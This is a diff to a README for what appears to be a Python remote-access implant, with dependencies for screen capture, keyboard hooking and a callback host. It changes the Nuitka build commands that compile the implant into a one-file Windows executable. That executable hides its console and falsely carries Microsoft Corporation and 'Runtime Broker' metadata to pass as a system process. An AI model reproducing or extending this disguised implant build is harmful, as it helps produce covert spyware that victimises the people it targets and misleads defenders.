@@ -38,10 +38,12 @@ pip install flask mss pillow opencv-python psutil pynput nuitka ordered-set zsta
 Edit `HOST` in `implant.py` if needed (default `192.168.122.1`).
 
 ```bash
+sudo apt install -y g++-mingw-w64-x86-64
 source venv/bin/activate
 nuitka \
   --standalone \
   --onefile \
+  --mingw64 \
   --windows-disable-console \
   --windows-company-name="Microsoft Corporation" \
   --windows-product-name="Runtime Broker" \
